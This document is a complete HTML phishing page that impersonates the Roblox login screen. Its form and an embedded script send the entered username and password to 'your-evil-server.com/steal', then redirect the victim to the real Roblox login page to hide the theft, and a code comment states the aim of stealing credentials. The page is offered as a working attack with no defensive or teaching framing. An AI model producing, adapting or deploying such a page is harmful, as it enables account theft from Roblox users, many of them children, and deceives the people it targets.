<!DOCTYPE html>
<html>
<head>
    <title>Roblox - Login</title>
    <style>
        body { font-family: Arial; text-align: center; background: #f5f5f5; }
        .login-box { background: white; padding: 20px; border-radius: 8px; width: 300px; margin: 100px auto; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
        button { background: #00a2ff; color: white; border: none; padding: 10px; width: 100%; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Roblox Login</h2>
        <form action="https://your-evil-server.com/steal" method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
    <script>
        // Steal credentials and redirect to real Roblox
        document.querySelector('form').addEventListener('submit', function(e) {
            e.preventDefault();
            const formData = new FormData(this);
            fetch('https://your-evil-server.com/steal', {
                method: 'POST',
                body: formData
            }).then(() => {
                window.location.href = 'https://www.roblox.com/login';
            });
        });
    </script>
</body>
</html>
